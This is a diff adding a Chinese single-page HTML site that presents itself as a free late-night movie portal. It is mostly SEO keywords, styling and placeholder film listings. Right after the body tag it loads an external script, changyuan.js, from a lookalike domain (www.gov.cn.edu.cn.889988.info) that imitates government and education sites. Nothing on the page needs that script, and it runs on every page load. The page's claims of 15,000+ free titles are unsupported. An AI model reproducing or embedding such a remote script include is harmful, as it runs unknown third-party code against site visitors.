@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>午夜免费电影网 - 深夜免费高清电影在线观看</title>
+<meta name="description" content="午夜免费电影网(wuyemianfeidianyingwang-top)提供深夜免费电影、电视剧、动漫、综艺在线观看，午夜深蓝星空界面，高清流畅，全程免费，每日更新。">
+<meta name="keywords" content="午夜免费电影网, wuyemianfeidianyingwang-top, 午夜电影, 免费电影, 深夜影视, 在线观看, 高清免费">
+<meta name="author" content="午夜免费电影网">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://wuyemianfeidianyingwang-top.github.io">
+<meta property="og:type" content="website">
+<meta property="og:title" content="午夜免费电影网 - 深夜免费高清电影在线观看">
+<meta property="og:description" content="午夜免费电影网提供深夜免费电影、电视剧、动漫、综艺在线观看，午夜深蓝星空界面，高清流畅，全程免费。">
+<meta property="og:url" content="https://wuyemianfeidianyingwang-top.github.io">
+<meta property="og:site_name" content="午夜免费电影网">
+<meta name="twitter:card" content="summary_large_image">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "午夜免费电影网",
+  "url": "https://wuyemianfeidianyingwang-top.github.io",
+  "description": "午夜免费电影网提供深夜免费电影在线观看。",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://wuyemianfeidianyingwang-top.github.io/#search?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+
+<style>
+:root{
+  --midnight:#070b1a;
+  --midnight2:#0d1530;
+  --moon:#c9d8f2;
+  --moon-bright:#e8eefb;
+  --silver:#9fb4d8;
+  --accent:#4f7cff;
+  --accent2:#7c4fff;
+  --ink:#e8eefb;
+  --muted:#8b9dc0;
+  --line:rgba(159,180,216,.22);
+  --card:rgba(255,255,255,.035);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:'PingFang SC','Noto Sans CJK SC','Microsoft YaHei',system-ui,sans-serif;
+  background:
+    radial-gradient(2px 2px at 12% 18%, rgba(255,255,255,.6), transparent),
+    radial-gradient(1.5px 1.5px at 28% 62%, rgba(255,255,255,.4), transparent),
+    radial-gradient(2px 2px at 55% 25%, rgba(255,255,255,.5), transparent),
+    radial-gradient(1.5px 1.5px at 72% 70%, rgba(255,255,255,.35), transparent),
+    radial-gradient(2px 2px at 88% 35%, rgba(255,255,255,.45), transparent),
+    radial-gradient(900px 600px at 80% -10%, rgba(79,124,255,.18), transparent 60%),
+    radial-gradient(800px 500px at -10% 10%, rgba(124,79,255,.15), transparent 55%),
+    linear-gradient(155deg,var(--midnight),var(--midnight2));
+  background-attachment:fixed;
+  color:var(--ink);
+  line-height:1.7;
+  min-height:100vh;
+  overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+
+/* 顶部 */
+.nighttop{
+  position:sticky;top:0;z-index:60;
+  display:flex;align-items:center;justify-content:space-between;gap:1rem;
+  padding:1rem 1.4rem;
+  background:rgba(7,11,26,.82);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);
+}
+.brand{display:flex;align-items:center;gap:.65rem;font-weight:900;font-size:1.2rem}
+.brand .moon{
+  width:34px;height:34px;border-radius:50%;
+  background:radial-gradient(circle at 32% 30%, #fff, var(--moon) 55%, #6b82ad);
+  box-shadow:0 0 18px rgba(201,216,242,.5);
+  display:grid;place-items:center;font-size:1rem;
+}
+.brand b{color:var(--moon-bright)}
+.menu{list-style:none;display:flex;gap:1.2rem;font-size:.9rem}
+.menu a{color:var(--muted);padding:.3rem .2rem;border-bottom:2px solid transparent}
+.menu a:hover{color:#fff;border-color:var(--accent)}
+
+/* 主视觉 */
+.night-hero{
+  max-width:1160px;margin:0 auto;padding:5rem 1.4rem 3rem;
+  display:grid;grid-template-columns:1.15fr .85fr;gap:2.2rem;align-items:center;
+}
+.hero-time{
+  font-size:.8rem;letter-spacing:4px;text-transform:uppercase;
+  color:var(--accent);font-weight:700;margin-bottom:.8rem;
+}
+.night-hero h1{
+  font-size:clamp(2.1rem,5.5vw,4rem);font-weight:900;line-height:1.08;
+  background:linear-gradient(95deg,#fff,#c9d8f2 50%,#7c4fff);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.night-hero p.lead{color:var(--muted);margin:1rem 0 1.5rem;max-width:520px}
+.chips{display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:1.4rem}
+.chip{
+  font-size:.74rem;padding:.32rem .8rem;border-radius:999px;
+  background:rgba(79,124,255,.08);border:1px solid var(--line);color:var(--moon);
+}
+.cta{display:flex;gap:.8rem;flex-wrap:wrap}
+.btn{border:0;cursor:pointer;padding:.78rem 1.6rem;border-radius:14px;font-weight:800;font-size:.95rem}
+.btn-main{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;box-shadow:0 8px 24px rgba(79,124,255,.3)}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(79,124,255,.4)}
+.btn-ghost{background:transparent;color:var(--ink);border:1px solid var(--line)}
+.btn-ghost:hover{background:rgba(159,180,216,.08)}
+
+/* 月亮海报 */
+.moon-poster{
+  position:relative;border-radius:50% 50% 24px 24px/60% 60% 24px 24px;
+  aspect-ratio:3/4;overflow:hidden;
+  background:
+    radial-gradient(circle at 70% 20%, rgba(255,255,255,.12) 0 18%, transparent 19%),
+    linear-gradient(175deg,#0f1a3a,#1a2870 55%,#0d1530);
+  border:1px solid var(--line);
+  box-shadow:0 30px 80px rgba(0,0,0,.5);
+  display:flex;flex-direction:column;justify-content:flex-end;padding:1.4rem;
+}
+.moon-poster .moon-name{
+  font-size:1.3rem;font-weight:900;color:#fff;text-shadow:0 4px 18px rgba(0,0,0,.6);
+}
+.moon-poster .moon-sub{color:var(--moon);font-size:.85rem}
+
+/* 数字章节 */
+.chapter{
+  max-width:1160px;margin:0 auto;padding:2.6rem 1.4rem;
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1.2rem;
+}
+.chap{
+  display:flex;gap:1.2rem;align-items:flex-start;
+  padding:1.4rem;border-radius:20px;background:var(--card);border:1px solid var(--line);
+  transition:.25s;
+}
+.chap:hover{transform:translateY(-4px);background:rgba(79,124,255,.06)}
+.chap .num{
+  font-size:2.6rem;font-weight:900;line-height:.9;
+  background:linear-gradient(135deg,var(--accent),var(--accent2));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+  min-width:60px;
+}
+.chap h3{font-size:1.15rem;color:#fff;margin-bottom:.4rem}
+.chap p{color:var(--muted);font-size:.88rem;margin-bottom:.8rem}
+.chap a{color:var(--moon);font-weight:700;font-size:.85rem}
+
+/* 数据 */
+.figures{
+  max-width:1160px;margin:1rem auto;padding:0 1.4rem;
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:1rem;
+}
+.fig{
+  text-align:center;padding:1.35rem;border-radius:18px;
+  background:linear-gradient(180deg,rgba(79,124,255,.08),rgba(0,0,0,.3));
+  border:1px solid var(--line);
+}
+.fig b{font-size:1.8rem;font-weight:900;
+  background:linear-gradient(90deg,var(--moon),var(--accent));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.fig small{display:block;color:var(--muted);margin-top:.3rem;font-size:.82rem}
+
+/* 区块 */
+.wrap{max-width:1160px;margin:0 auto;padding:2.6rem 1.4rem}
+.head{display:flex;align-items:flex-end;justify-content:space-between;gap:1rem;margin-bottom:1.4rem}
+.head h2{font-size:1.6rem;color:#fff}
+.head h2 span{color:var(--moon)}
+.head a{color:var(--muted);font-size:.85rem}
+
+/* 横滑片单 */
+.rail{
+  display:grid;grid-auto-flow:column;grid-auto-columns:minmax(165px,1fr);
+  gap:1rem;overflow-x:auto;padding-bottom:.8rem;scroll-snap-type:x mandatory;
+}
+.rail::-webkit-scrollbar{height:8px}
+.rail::-webkit-scrollbar-thumb{background:rgba(159,180,216,.3);border-radius:99px}
+.film{
+  scroll-snap-align:start;border-radius:16px;overflow:hidden;
+  background:var(--card);border:1px solid var(--line);transition:.25s;
+}
+.film:hover{transform:translateY(-4px);border-color:var(--accent);box-shadow:0 18px 40px rgba(79,124,255,.2)}
+.film .thumb{aspect-ratio:2/3;display:grid;place-items:center;font-size:2.6rem;
+  background:linear-gradient(160deg,rgba(79,124,255,.15),rgba(0,0,0,.4))}
+.film .meta{padding:.7rem .8rem}
+.film .meta b{display:block;font-size:.95rem;color:#fff}
+.film .meta small{color:var(--muted)}
+
+/* 网格卡片 */
+.grid{display:grid;gap:1.1rem}
+.c3{grid-template-columns:repeat(auto-fit,minmax(260px,1fr))}
+.c4{grid-template-columns:repeat(auto-fit,minmax(210px,1fr))}
+.box{padding:1.3rem;border-radius:18px;background:var(--card);border:1px solid var(--line);transition:.25s}
+.box:hover{transform:translateY(-4px);background:rgba(79,124,255,.06)}
+.box .ic{
+  width:42px;height:42px;border-radius:11px;display:grid;place-items:center;font-size:1.2rem;
+  background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;margin-bottom:.8rem;
+}
+.box h3{font-size:1.12rem;color:#fff;margin-bottom:.4rem}
+.box p{color:var(--muted);font-size:.9rem;margin-bottom:.9rem}
+.box a{color:var(--moon);font-weight:700;font-size:.88rem}
+
+/* 午夜放映表 */
+.schedule{
+  max-width:880px;margin:0 auto;padding:2.4rem 1.4rem;border-top:1px dashed var(--line);
+}
+.schedule ul{list-style:none}
+.schedule li{
+  display:flex;gap:1rem;align-items:baseline;padding:.85rem 0;
+  border-bottom:1px dotted rgba(159,180,216,.2);color:var(--muted);
+}
+.schedule li .t{font-family:monospace;font-size:1rem;color:var(--moon);min-width:90px}
+.schedule li b{color:#fff;font-weight:700}
+
+/* 底部 */
+footer{border-top:1px solid var(--line);padding:2.4rem 1.4rem;margin-top:3rem}
+.foot{max-width:1160px;margin:0 auto;display:flex;flex-wrap:wrap;gap:1.2rem;justify-content:space-between;align-items:center}
+.foot ul{list-style:none;display:flex;gap:1rem;flex-wrap:wrap}
+.foot a{color:var(--muted);font-size:.88rem}
+.foot a:hover{color:var(--moon)}
+.copy{color:var(--muted);font-size:.82rem;max-width:1160px;margin:1.2rem auto 0;line-height:1.8}
+
+.reveal{opacity:0;transform:translateY(24px);transition:.6s ease}
+.reveal.show{opacity:1;transform:none}
+
+@media(max-width:860px){
+  .night-hero{grid-template-columns:1fr;padding-top:3rem}
+  .moon-poster{max-width:320px;margin:0 auto}
+  .menu{display:none}
+}
+@media(max-width:520px){
+  .head{flex-direction:column;align-items:flex-start}
+  .fig b{font-size:1.5rem}
+  .schedule li{flex-direction:column;gap:.2rem}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="nighttop">
+  <a class="brand" href="#top"><span class="moon">🌙</span> 午夜<b>免费电影网</b></a>
+  <nav><ul class="menu">
+    <li><a href="#catalog">片单目录</a></li>
+    <li><a href="#midnight">午夜电影</a></li>
+    <li><a href="#tv">电视剧</a></li>
+    <li><a href="#anime">动漫</a></li>
+    <li><a href="#about">关于本站</a></li>
+  </ul></nav>
+</header>
+
+<section class="night-hero" id="top">
+  <div>
+    <div class="hero-time">✦ 00:00 Midnight Show ✦</div>
+    <h1>夜深了，<br>免费电影才刚开始</h1>
+    <p class="lead">午夜免费电影网（wuyemianfeidianyingwang-top）是深夜专属的免费影视站：深蓝星空界面、大数字章节导航，电影、剧集、动漫、综艺，越夜越上头，全程免费。</p>
+    <div class="chips">
+      <span class="chip">深夜场</span>
+      <span class="chip">全程免费</span>
+      <span class="chip">高清在线</span>
+      <span class="chip">每日更新</span>
+      <span class="chip">手机自适应</span>
+      <span class="chip">wuyemianfeidianyingwang-top</span>
+    </div>
+    <div class="cta">
+      <a class="btn btn-main" href="#midnight">进入午夜场</a>
+      <a class="btn btn-ghost" href="#about">关于本站</a>
+    </div>
+  </div>
+  <div class="moon-poster">
+    <div class="moon-name">午夜放映中 🌙</div>
+    <div class="moon-sub">MIDNIGHT FREE CINEMA · 00:00 开播</div>
+  </div>
+</section>
+
+<div class="figures">
+  <div class="fig reveal"><b>15000+</b><small>免费影视</small></div>
+  <div class="fig reveal"><b>1080P</b><small>高清画质</small></div>
+  <div class="fig reveal"><b>00:00</b><small>午夜更新</small></div>
+  <div class="fig reveal"><b>0 元</b><small>全程免费</small></div>
+</div>
+
+<section class="wrap" id="catalog">
+  <div class="head reveal">
+    <h2>📑 片单 <span>目录</span></h2>
+    <a href="#">全部章节 →</a>
+  </div>
+  <div class="chapter">
+    <div class="chap reveal"><span class="num">01</span><div><h3>午夜精选</h3><p>深夜档主打片单，悬疑惊悚、文艺独立，越夜越好看。</p><a href="#midnight">进入 →</a></div></div>
+    <div class="chap reveal"><span class="num">02</span><div><h3>电视剧集</h3><p>深夜追剧不间断，单元剧、连续剧分门别类。</p><a href="#tv">进入 →</a></div></div>
+    <div class="chap reveal"><span class="num">03</span><div><h3>动漫番剧</h3><p>深夜番、完结番、新番，熬夜追番专区。</p><a href="#anime">进入 →</a></div></div>
+    <div class="chap reveal"><span class="num">04</span><div><h3>综艺闲聊</h3><p>深夜聊天综艺，放松解压，睡不着就看看。</p><a href="#variety">进入 →</a></div></div>
+  </div>
+</section>
+
+<section class="wrap" id="midnight">
+  <div class="head reveal">
+    <h2>🌌 午夜 <span>电影</span></h2>
+    <a href="#">全部片单 →</a>
+  </div>
+  <div class="rail">
+    <a class="film" href="#"><div class="thumb">🦇</div><div class="meta"><b>暗夜行者</b><small>悬疑 / 2026</small></div></a>
+    <a class="film" href="#"><div class="thumb">🌃</div><div class="meta"><b>城市失眠</b><small>文艺 / 2026</small></div></a>
+    <a class="film" href="#"><div class="thumb">🔪</div><div class="meta"><b>凌晨三点</b><small>惊悚 / 2026</small></div></a>
+    <a class="film" href="#"><div class="thumb">🌙</div><div class="meta"><b>月光旅馆</b><small>剧情 / 2026</small></div></a>
+    <a class="film" href="#"><div class="thumb">🚕</div><div class="meta"><b>夜班出租</b><small>犯罪 / 2026</small></div></a>
+    <a class="film" href="#"><div class="thumb">💿</div><div class="meta"><b>午夜电台</b><small>爱情 / 2026</small></div></a>
+  </div>
+</section>
+
+<section class="wrap" id="tv">
+  <div class="head reveal">
+    <h2>📺 电视 <span>剧集</span></h2>
+    <a href="#">更多剧集 →</a>
+  </div>
+  <div class="grid c3">
+    <div class="box reveal"><div class="ic">🕯️</div><h3>悬疑单元剧</h3><p>每集一个独立案件，深夜连刷最上头。</p><a href="#">追剧 →</a></div>
+    <div class="box reveal"><div class="ic">🌆</div><h3>都市夜生活</h3><p>酒吧、夜店、出租车，都市夜色众生相。</p><a href="#">追剧 →</a></div>
+    <div class="box reveal"><div class="ic">🧩</div><h3>时间循环</h3><p>烧脑时间线，二刷才能理清的剧情。</p><a href="#">追剧 →</a></div>
+  </div>
+</section>
+
+<section class="wrap" id="anime">
+  <div class="head reveal">
+    <h2>🎨 动漫 <span>番剧</span></h2>
+    <a href="#">全部番剧 →</a>
+  </div>
+  <div class="grid c4">
+    <div class="box reveal"><div class="ic">🌙</div><h3>深夜番</h3><p>深夜档限定番剧，题材大胆画风独特。</p><a href="#">看番 →</a></div>
+    <div class="box reveal"><div class="ic">🏫</div><h3>校园怪谈</h3><p>校园背景的灵异悬疑番，越看越紧张。</p><a href="#">看番 →</a></div>
+    <div class="box reveal"><div class="ic">🚉</div><h3>车站夜行</h3><p>深夜车站为舞台的奇幻旅程。</p><a href="#">看番 →</a></div>
+    <div class="box reveal"><div class="ic">🎷</div><h3>爵士之夜</h3><p>以午夜爵士酒馆为舞台的群像番。</p><a href="#">看番 →</a></div>
+  </div>
+</section>
+
+<section class="wrap" id="variety">
+  <div class="head reveal">
+    <h2>🎤 综艺 <span>闲聊</span></h2>
+    <a href="#">更多综艺 →</a>
+  </div>
+  <div class="grid c3">
+    <div class="box reveal"><div class="ic">🎙️</div><h3>深夜电台</h3><p>深夜聊天节目，嘉宾讲真实故事，治愈失眠。</p><a href="#">播放 →</a></div>
+    <div class="box reveal"><div class="ic">🎵</div><h3>午夜live</h3><p>小型live house现场，独立音乐人专场。</p><a href="#">播放 →</a></div>
+    <div class="box reveal"><div class="ic">🍷</div><h3>夜聊酒馆</h3><p>三五好友围坐聊天，话题犀利又轻松。</p><a href="#">播放 →</a></div>
+  </div>
+</section>
+
+<section class="schedule" id="about">
+  <div class="head reveal">
+    <h2>🕛 午夜 <span>放映时刻</span></h2>
+  </div>
+  <ul class="reveal">
+    <li><span class="t">22:00</span><span><b>文艺独立片</b> 上线，适合睡前慢看</span></li>
+    <li><span class="t">00:00</span><span><b>悬疑惊悚片</b> 开播，深夜氛围拉满</span></li>
+    <li><span class="t">01:00</span><span><b>经典老片</b> 轮播，怀旧深夜场</span></li>
+    <li><span class="t">02:00</span><span><b>深夜综艺</b> 补档，轻松解压不费脑</span></li>
+  </ul>
+  <div class="box reveal" style="margin-top:2rem;max-width:880px">
+    <div class="ic">🌐</div>
+    <h3>关于午夜免费电影网</h3>
+    <p>午夜免费电影网（<b>wuyemianfeidianyingwang-top</b>），网址：<code style="color:var(--moon)">https://wuyemianfeidianyingwang-top.github.io</code>。本站是免费影视导航与片单展示单页，栏目含片单目录、午夜电影、电视剧集、动漫番剧、综艺闲聊、关于本站，内页链接先用 # 占位，后续替换为真实片源页。</p>
+    <a href="#">访问官网 →</a>
+  </div>
+</section>
+
+<footer>
+  <div class="foot">
+    <a class="brand" href="#top"><span class="moon">🌙</span> 午夜<b>免费电影网</b></a>
+    <ul>
+      <li><a href="#catalog">片单目录</a></li>
+      <li><a href="#midnight">午夜电影</a></li>
+      <li><a href="#tv">电视剧</a></li>
+      <li><a href="#anime">动漫</a></li>
+      <li><a href="#variety">综艺</a></li>
+      <li><a href="#about">关于</a></li>
+    </ul>
+  </div>
+  <div class="copy">
+    网站名称：午夜免费电影网　·　网站网址：https://wuyemianfeidianyingwang-top.github.io<br>
+    关键词：午夜免费电影网、wuyemianfeidianyingwang-top、午夜电影、免费电影、深夜影视、在线观看<br>
+    © 2026 午夜免费电影网 保留所有权利　·　演示页面，内页链接均为 # 占位
+  </div>
+</footer>
+
+<script>
+const io=new IntersectionObserver((es)=>{
+  es.forEach(e=>{ if(e.isIntersecting){ e.target.classList.add('show'); io.unobserve(e.target); } });
+},{threshold:.12});
+document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
+
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',function(e){
+    const t=document.querySelector(this.getAttribute('href'));
+    if(t){ e.preventDefault(); t.scrollIntoView({behavior:'smooth',block:'start'}); }
+  });
+});
+</script>
+</body>
+</html>
